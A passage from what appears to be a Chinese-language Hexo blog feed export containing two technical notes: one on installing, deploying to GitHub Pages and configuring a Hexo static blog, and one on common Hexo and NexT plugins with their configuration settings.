<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo server					<span class="comment"># 开启服务</span></span><br></pre></td></tr></table></figure>
<p>开启hexo服务后，即可通过本地访问 blog 页面（默认为
<code>localhost:4000</code> ）预览博客页面。</p>
<p>可选的额外选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo s						<span class="comment"># 简化指令</span></span><br><span class="line">hexo s -s					<span class="comment"># 静态模式</span></span><br><span class="line">hexo s -p 5000				<span class="comment"># 更改端口</span></span><br><span class="line">hexo s -i 192.168.1.5		<span class="comment"># 自定义ip</span></span><br></pre></td></tr></table></figure>
<h2 id="hexo-部署">hexo 部署</h2>
<p>这里通过 Github 的免费托管仓库进行部署博客。</p>
<p>先用 Github 创建一个名为 <code>&lt;username&gt;.github.io</code>
的仓库</p>
<blockquote>
<p>以我为例创建的仓库名为 <code>HasegawaAzusa.github.io</code></p>
</blockquote>
<p>在博客根目录下安装 <code>hexo-deployer-git</code> 部署插件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
<p>更改 hexo 站点配置文件 (<code>~/_config.yml</code>) 中的 <a href="#部署%20-%20Deployment">Deployment配置项</a></p>
<p>以我为例更改的配置项结果为</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:HasegawaAzusa/HasegawaAzusa.github.io.git</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>repo</code> 使用 ssh 链接的原因：我的 git 使用 ssh 与 github
进行远程连接</p>
<p>git 使用 https 与 github 进行远程连接请使用 https 链接</p>
</blockquote>
<p>在<strong>博客根目录</strong>下，输入部署指令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo deploy					<span class="comment"># 部署指令</span></span><br></pre></td></tr></table></figure>
<p>可选的额外指令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo d						<span class="comment"># 简化指令</span></span><br><span class="line">hexo clean					<span class="comment"># 清理缓存 (在自动化生成前最好清理缓存)</span></span><br><span class="line">hexo g -d					<span class="comment"># 一个命令完成自动化生成 (generate) 并部署 (deploy)</span></span><br></pre></td></tr></table></figure>
<p>等待一段时间后，可以通过
<code>https://&lt;username&gt;.github.io</code> 访问自己的博客。</p>
<blockquote>
<p>以我为例链接为 https://hasegawaazusa.github.io</p>
</blockquote>
<h1 id="hexo-入门">hexo 入门</h1>
<h2 id="hexo-更新">hexo 更新</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm update -g hexo-cli		<span class="comment"># 使用 npm 更新 hexo</span></span><br></pre></td></tr></table></figure>
<h2 id="hexo-新建博文">hexo 新建博文</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new hello				<span class="comment"># 新建博文</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>hello</strong>可自由更改，对应生成的md文件名</p>
</blockquote>
<p>可选的额外选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n hello				<span class="comment"># 简化指令</span></span><br><span class="line">hexo n post hello			<span class="comment"># 新编博文并立即发布。默认 ~/source/_posts/hello.md</span></span><br><span class="line">hexo n draft hello			<span class="comment"># 新编博文但暂不发布。默认 ~/source/_drafts/hello.md</span></span><br><span class="line">hexo n page hello			<span class="comment"># 新建页面（标签页，分类页等）。默认 ~/source/hello</span></span><br></pre></td></tr></table></figure>
<p>然后进入 <code>~/source/_posts/</code> 找到 <code>hello.md</code>
，打开文件，内容如下</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">title<span class="punctuation">:</span> hello</span><br><span class="line">date<span class="punctuation">:</span> <span class="number">1970</span><span class="number">-1</span><span class="number">-1</span> <span class="number">8</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">00</span></span><br><span class="line">tags<span class="punctuation">:</span> <span class="punctuation">[</span>hello<span class="punctuation">,</span> demo<span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
<p>该头为 <code>Front-matter</code> ，参数如下：</p>
<ul>
<li><p><strong><code>title</code></strong> → 博文标题</p></li>
<li><p><strong><code>date</code></strong> →
发布日期，默认为文件创建日期</p></li>
<li><p><strong><code>tags</code></strong> → 博文标签</p></li>
</ul>
<p>修改后，在正文处输入内容即可编辑博文内容。<code>.md</code>格式文本示例如下：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: hello</span><br><span class="line">date: 1970-1-1 8:00:00</span><br><span class="line"><span class="section">tags: [hello, demo]</span></span><br><span class="line"><span class="section">---</span></span><br><span class="line"><span class="section"># First Blog</span></span><br><span class="line">This is my <span class="strong">**first**</span> blog!</span><br><span class="line">Do you like?</span><br></pre></td></tr></table></figure>
<h2 id="hexo-主题">hexo 主题</h2>
<p>进入 https://hexo.io/themes/ 进行挑选合适的主题</p>
<p>这里以配置 <code>NexT</code> 主题为例：</p>
<p>打开 <code>Powershell</code> 输入以下命令，安装 <code>NexT</code>
主题</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-theme-next --save</span><br></pre></td></tr></table></figure>
<p>更改 hexo 站点配置文件 (<code>~/_config.yml</code>) 中的 <a href="#扩展%20-%20Extensions"><code>Extensions</code>配置项</a></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br></pre></td></tr></table></figure>
<p>重新进行网页生成即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean					<span class="comment"># 清除缓存</span></span><br><span class="line">hexo g -d					<span class="comment"># 重新生成并部署</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>了解 NexT 主题的更多信息可以使用<a href="/next-note.html">NexT
笔记</a></p>
</blockquote>
<h2 id="hexo-博文插入超链接">hexo 博文插入超链接</h2>
<p>对于站外的超链接，直接将外站的完整链接贴入括号内即可
(<code>[value](link)</code>)，例如</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">点击[<span class="string">这里</span>](<span class="link">https://hasegawaazusa.github.io</span>)进入博客</span><br></pre></td></tr></table></figure>
<p>效果如下</p>
<blockquote>
<p>点击<a href="https://hasegawaazusa.github.io">这里</a>进入博客</p>
</blockquote>
<p>对于站内的超链接，最好使用另一篇博客的 <code>permalink</code> 贴入
(有关 <code>permalink</code> 可参考<a href="#hexo%20博文头%20-%20Front-matter">hexo 配置详解</a>)，例如</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">点击[<span class="string">这里</span>](<span class="link">/hexo-note.html</span>)进入博客</span><br></pre></td></tr></table></figure>
<p>效果如下</p>
<blockquote>
<p>点击<a href="/hexo-note.html">这里</a>进入博客</p>
</blockquote>
<p>若需要导航，可以使用 <code>permalink#title</code> ，例如</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">点击[<span class="string">这里</span>](<span class="link">/hexo-note.html#hexo 博文插入超链接</span>)进入博客</span><br></pre></td></tr></table></figure>
<p>效果如下</p>
<blockquote>
<p>点击<a href="/hexo-note.html#hexo%20博文插入超链接">这里</a>进入博客</p>
</blockquote>
<h2 id="hexo-博文插入图片">hexo 博文插入图片</h2>
<p>更改hexo配置文件 (<code>next/_config.yml</code>) 中的<a href="#文章%20-%20Writing">Writing配置项</a></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>该选项为真时，新建博文会对应生成一个与文章同名的文件夹，可以将相关图片资源放进此文件夹内</p>
</blockquote>
<p>在<strong>博客根目录</strong>下安装<strong><code>hexo-asset-image</code></strong>插件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>
<p>将相关图片资源放进对应文件夹并直接使用文件夹内的资源即可。</p>
<p>特别地，对于 <code>Typora</code> 使用者，可以在
<code>文件 - 偏好设置 - 图像</code> 中修改设置：</p>
<figure>
<img src="/hexo-note/typorasetting.png" alt="typorasetting">
<figcaption aria-hidden="true">typorasetting</figcaption>
</figure>
<p>这样，当 <code>Typora</code> 插入图片时，会自动将图片资源复制进入
hexo 可以检索的 asset 文件夹</p>
<h2 id="hexo-添加标签页">hexo 添加标签页</h2>
<p>在博客根目录下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure>
<p>在 Front-matter 中添加：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">type:</span> <span class="string">tags</span></span><br></pre></td></tr></table></figure>
<figure>
<img src="/hexo-note/index.png" alt="index">
<figcaption aria-hidden="true">index</figcaption>
</figure>
<p>完成后 hexo 便会自动生成标签页</p>
<blockquote>
<p>记得在菜单中添加进入方式</p>
</blockquote>
<h2 id="hexo-添加关于页">hexo 添加关于页</h2>
<p>在博客根目录下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page about</span><br></pre></td></tr></table></figure>
<p>在 Front-matter 中添加：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">type:</span> <span class="string">about</span></span><br></pre></td></tr></table></figure>
<p>在正文中输入关于页内容即可</p>
<blockquote>
<p>记得在添加进入方式</p>
</blockquote>
<h2 id="hexo-添加-404-页面">hexo 添加 404 页面</h2>
<p>在博客根目录下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page 404</span><br></pre></td></tr></table></figure>
<p>在 Front-matter 中添加：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">permalink:</span> <span class="string">/404</span></span><br></pre></td></tr></table></figure>
<p>在正文中输入你需要的内容即可</p>
<p>如果需要其他自定义页面，可以使用 <code>layout</code> 参数</p>
<h1 id="hexo-配置详解">hexo 配置详解</h1>
<h2 id="hexo-博文头---front-matter">hexo 博文头 - Front-matter</h2>
<table>
<colgroup>
<col style="width: 12%">
<col style="width: 43%">
<col style="width: 43%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">参数</th>
<th style="text-align: left;">意义</th>
<th style="text-align: left;">默认值</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><code>layout</code></td>
<td style="text-align: left;">排版</td>
<td style="text-align: left;"><a href="https://hexo.io/docs/configuration#Writing"><code>config.default_layout</code></a></td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>title</code></td>
<td style="text-align: left;">标题</td>
<td style="text-align: left;">文件名</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>date</code></td>
<td style="text-align: left;">发布日期</td>
<td style="text-align: left;">文件创建日期</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>updated</code></td>
<td style="text-align: left;">更新日期</td>
<td style="text-align: left;">文件更新日期</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>comments</code></td>
<td style="text-align: left;">简介</td>
<td style="text-align: left;"><code>true</code></td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>tags</code></td>
<td style="text-align: left;">标签</td>
<td style="text-align: left;"></td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>categories</code></td>
<td style="text-align: left;">分类</td>
<td style="text-align: left;"></td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>permalink</code></td>
<td style="text-align: left;">永久链接的相对路径
(如<code>/index.html</code>)</td>
<td style="text-align: left;"><code>null</code></td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>excerpt</code></td>
<td style="text-align: left;">纯文本摘录 (需要使用插件<a href="https://hexo.io/docs/tag-plugins#Post-Excerpt">Post-Excerpt</a>)</td>
<td style="text-align: left;"></td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>disableNunjucks</code></td>
<td style="text-align: left;">是否禁用 Nunjucks 的宏
(<code>&#123;&#123; &#125;&#125;</code> / <code>&#123;% %&#125;</code>)
和 <a href="https://hexo.io/docs/tag-plugins">tag plugins</a> 插件</td>
<td style="text-align: left;"><code>false</code></td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>lang</code></td>
<td style="text-align: left;">指定语言</td>
<td style="text-align: left;"><code>_config.yml</code></td>
</tr>
</tbody>
</table>
<h2 id="hexo-站点配置文件">hexo 站点配置文件</h2>
<p>即 <code>~/_config.yml</code> 参数详解</p>
<h3 id="网站---site">网站 - Site</h3>
<ul>
<li><code>title</code> → 博客标题</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hexo</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">&#x27;&#x27;</span>				<span class="comment"># 博客副标题</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">&#x27;&#x27;</span>				<span class="comment"># 博客描述 (与搜索引擎的收录有关)</span></span><br><span class="line"><span class="attr">keywords:</span>					<span class="comment"># 博客关键字，支持多个关键字 (与搜索引擎的收录有关)</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">John</span> <span class="string">Doe</span>			<span class="comment"># 博客作者名</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">en</span>				<span class="comment"># 博客使用的语言 (可设置为zh-Hans或zh-CN以支持中文)</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">&#x27;&#x27;</span>				<span class="comment"># 博客时区 (默认使用电脑时区)</span></span><br></pre></td></tr></table></figure>
<h3 id="网址---url">网址 - URL</h3>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="comment">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">http://example.com</span>						<span class="comment"># 博客网址，必须以 http:// 或 https:// 开头</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span>		<span class="comment"># 文章连接生成规则</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line"><span class="attr">pretty_urls:</span></span><br><span class="line">  <span class="attr">trailing_index:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span></span><br><span class="line">  <span class="attr">trailing_html:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;.html&#x27; from permalinks</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>一般只需要修改<strong><code>url</code></strong></p>
</blockquote>
<h3 id="目录---directory">目录 - Directory</h3>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">source_dir:</span> <span class="string">source</span>			<span class="comment"># 资源文件夹，这个文件夹用来存放内容。</span></span><br><span class="line"><span class="attr">public_dir:</span> <span class="string">public</span>			<span class="comment"># 公共文件夹，这个文件夹用于存放生成的站点文件。</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span>				<span class="comment"># 标签文件夹。</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span>		<span class="comment"># 归档文件夹。</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span>	<span class="comment"># 分类文件夹。</span></span><br><span class="line"><span class="attr">code_dir:</span> <span class="string">downloads/code</span>	<span class="comment"># Include code 文件夹， source_dir 下的子目录。</span></span><br><span class="line"><span class="attr">i18n_dir:</span> <span class="string">:lang</span>				<span class="comment"># 国际化（i18n）文件夹</span></span><br><span class="line"><span class="attr">skip_render:</span>				<span class="comment"># 跳过指定文件的渲染。详见参考</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>一般无需修改</p>
</blockquote>
<h3 id="文章---writing">文章 - Writing</h3>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Writing</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span>	<span class="comment"># 新文章的文件名称</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span>		<span class="comment"># 预设布局</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span>			<span class="comment"># 把标题转换为 title case</span></span><br><span class="line"><span class="attr">external_link:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>				<span class="comment"># 在新标签中打开链接</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span>				<span class="comment"># 作用域，网站/文章 (site / post)</span></span><br><span class="line">  <span class="attr">exclude:</span> <span class="string">&#x27;&#x27;</span>				<span class="comment"># 需要排除的域名。主域名和子域名如 www 需分别配置</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span>			<span class="comment"># 把文件名称转换为 (1) 小写或 (2) 大写 (0 = 不转换) </span></span><br><span class="line"><span class="attr">render_drafts:</span> <span class="literal">false</span>		<span class="comment"># 显示草稿</span></span><br><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">false</span>	<span class="comment"># 启动 Asset 文件夹</span></span><br><span class="line"><span class="attr">relative_link:</span> <span class="literal">false</span>		<span class="comment"># 把链接改为与根目录的相对位址</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span>				<span class="comment"># 显示未来的文章</span></span><br><span class="line"><span class="attr">highlight:</span>					<span class="comment"># 代码块的设置, 请参考 Highlight.js 进行设置	</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hljs:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">prismjs:</span>					<span class="comment"># 代码块的设置, 请参考 PrismJS 进行设置</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">preprocess:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong><a href="https://hexo.io/docs/syntax-highlight#Highlight-js">Highlight.js</a></strong></p>
<p><strong><a href="https://hexo.io/docs/syntax-highlight#PrismJS">PrismJS</a></strong></p>
</blockquote>
<h3 id="首页设置---home-page-setting">首页设置 - Home page setting</h3>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Home page setting</span></span><br><span class="line"><span class="comment"># per_page: Posts displayed per page. (0 = disable pagination)</span></span><br><span class="line"><span class="comment"># order_by: Posts order. (Order by date descending by default)</span></span><br><span class="line"><span class="attr">index_generator:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">&#x27;&#x27;</span>					<span class="comment"># 首页的根目录。默认为&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="number">10</span>				<span class="comment"># 每页显示文章的数量。默认为 10 (0 = 关闭分页功能)</span></span><br><span class="line">  <span class="attr">order_by:</span> <span class="string">-date</span>			<span class="comment"># 显示文章的顺序。默认为 -date (date 是按日期升序排序)</span></span><br></pre></td></tr></table></figure>
<h3 id="分类-标签---category-tag">分类 &amp; 标签 - Category &amp;
Tag</h3>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Category &amp; Tag</span></span><br><span class="line"><span class="attr">default_category:</span> <span class="string">uncategorized</span>		<span class="comment"># 默认分类</span></span><br><span class="line"><span class="attr">category_map:</span>						<span class="comment"># 分类别名</span></span><br><span class="line"><span class="attr">tag_map:</span>							<span class="comment"># 标签别名</span></span><br></pre></td></tr></table></figure>
<h3 id="日期-时间格式---date-time-format">日期 / 时间格式 - Date / Time
format</h3>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Date / Time format</span></span><br><span class="line"><span class="comment">## Hexo uses Moment.js to parse and display date</span></span><br><span class="line"><span class="comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line"><span class="attr">date_format:</span> <span class="string">YYYY-MM-DD</span>			<span class="comment"># 日期格式</span></span><br><span class="line"><span class="attr">time_format:</span> <span class="string">HH:mm:ss</span>			<span class="comment"># 时间格式</span></span><br><span class="line"><span class="comment">## updated_option supports &#x27;mtime&#x27;, &#x27;date&#x27;, &#x27;empty&#x27;</span></span><br><span class="line"><span class="attr">updated_option:</span> <span class="string">&#x27;mtime&#x27;</span>			<span class="comment"># 当 Front Matter 中没有指定 updated 时 updated 的取值</span></span><br></pre></td></tr></table></figure>
<h3 id="分页---pagination">分页 - Pagination</h3>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Pagination</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line"><span class="attr">per_page:</span> <span class="number">10</span>					<span class="comment"># 每页显示的文章量 (0 = 关闭分页功能)</span></span><br><span class="line"><span class="attr">pagination_dir:</span> <span class="string">page</span>			<span class="comment"># 分页目录</span></span><br></pre></td></tr></table></figure>
<h3 id="扩展---extensions">扩展 - Extensions</h3>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">landscape</span>				<span class="comment"># 当前主题名称。值为 false 时禁用主题</span></span><br></pre></td></tr></table></figure>
<h3 id="部署---deployment">部署 - Deployment</h3>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span>						<span class="comment"># 部署方式</span></span><br><span class="line">  <span class="attr">repo:</span> 						<span class="comment"># 库（Repository）地址，SSH比较好</span></span><br><span class="line">  <span class="attr">branch:</span> 						<span class="comment"># 可选，分支名称（Github默认为master）</span></span><br><span class="line">  <span class="attr">message:</span> 						<span class="comment"># 自定义提交信息（默认为Site updated: &#123;&#123; now(&quot;YYYY-MM-DD HH:mm:ss&quot;) &#125;&#125;）</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>git</tag>
        <tag>hexo</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo 插件笔记</title>
    <url>//hexo-plugins-note.html</url>
    <content><![CDATA[<h2 id="hexo-插件---hexo-word-counter">hexo 插件 -
<code>hexo-word-counter</code></h2>
<p>实现字数统计与阅读时间预估功能</p>
<ul>
<li><p><strong>安装指令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-word-counter --save</span><br></pre></td></tr></table></figure></li>
<li><p><strong>hexo 配置</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="attr">symbols:</span> <span class="literal">true</span>					<span class="comment"># 显示博文字数</span></span><br><span class="line">  <span class="attr">time:</span> <span class="literal">true</span>					<span class="comment"># 显示预计阅读时间</span></span><br><span class="line">  <span class="attr">total_symbols:</span> <span class="literal">true</span>			<span class="comment"># 在页脚显示总字数</span></span><br><span class="line">  <span class="attr">total_time:</span> <span class="literal">true</span>				<span class="comment"># 在页脚显示总阅读时间</span></span><br><span class="line">  <span class="attr">awl:</span> <span class="number">4</span>						<span class="comment"># 平均字长 (用于计算)</span></span><br><span class="line">  <span class="attr">wpm:</span> <span class="number">275</span>						<span class="comment"># 每分钟阅读的平均字数 (用于计算)</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>NexT 主题配置</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="attr">separated_meta:</span> <span class="literal">true</span>			<span class="comment"># 字数和阅读时间是否分行显示</span></span><br><span class="line">  <span class="attr">item_text_total:</span> <span class="literal">true</span>			<span class="comment"># 页脚是否显示字数和阅读时间 (默认不显示)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="hexo-插件---hexo-generator-searchdb">hexo 插件 -
<code>hexo-generator-searchdb</code></h2>
<p>实现本地搜索功能</p>
<ul>
<li><p><strong>安装指令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure></li>
<li><p><strong>hexo 配置</strong></p>
<ul>
<li><code>path</code> → 搜索记录文件</li>
<li><code>field</code> → 搜索内容</li>
<li><code>format</code> → 搜索后缀</li>
<li><code>limit</code> → 最大搜索限制</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Local search</span></span><br><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>NexT 主题配置</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span>					<span class="comment"># 是否无视回车自动搜索 (auto | maual)</span></span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">1</span>			<span class="comment"># 每个搜索展示几个结果</span></span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span>				<span class="comment"># 读取内容</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="literal">false</span>				<span class="comment"># 预读取页面内容</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="hexo-插件---hexo-all-minifier">hexo 插件 -
<code>hexo-all-minifier</code></h2>
<p>可以对html、css、js、images进行压缩，即把重复的代码合并，把多余的空格去掉，用算法对images进行压缩，加快网页加载速度。</p>
<ul>
<li><p><strong>安装指令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-all-minifier --save</span><br></pre></td></tr></table></figure></li>
<li><p><strong>hexo 配置</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">html_minifier:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">ignore_error:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">css_minifier:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;*.min.css&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">js_minifier:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mangle:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">output:</span></span><br><span class="line">  <span class="attr">compress:</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;*.min.js&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">image_minifier:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">interlaced:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">multipass:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">optimizationLevel:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">pngquant:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">progressive:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="next-插件---hexo-related-popular-posts">NexT 插件 -
<code>hexo-related-popular-posts</code></h2>
<p>实现热门相关帖子功能</p>
<ul>
<li><p><strong>安装指令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-related-popular-posts --save</span><br></pre></td></tr></table></figure></li>
<li><p><strong>NexT 主题配置</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">related_posts:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span>					<span class="comment"># 是否开启插件</span></span><br><span class="line">  <span class="attr">title:</span>						<span class="comment"># related-popular-posts 的名字 (默认使用相关文章)</span></span><br><span class="line">  <span class="attr">display_in_home:</span> <span class="literal">false</span>		<span class="comment"># 是否在首页使用相关/热门帖子</span></span><br><span class="line">  <span class="attr">params:</span></span><br><span class="line">    <span class="attr">maxCount:</span> <span class="number">5</span>					<span class="comment"># 最大显示</span></span><br><span class="line">    <span class="comment">#PPMixingRate: 0.0			# 热门与相关的混合比例</span></span><br><span class="line">    <span class="comment">#isDate: false				# 是否显示日期</span></span><br><span class="line">    <span class="comment">#isImage: false				# 是否显示图像</span></span><br><span class="line">    <span class="comment">#isExcerpt: false			# 是否显示摘录</span></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>hexo</tag>
        <tag>NexT</tag>
        <tag>plugins</tag>
      </tags>
  </entry>
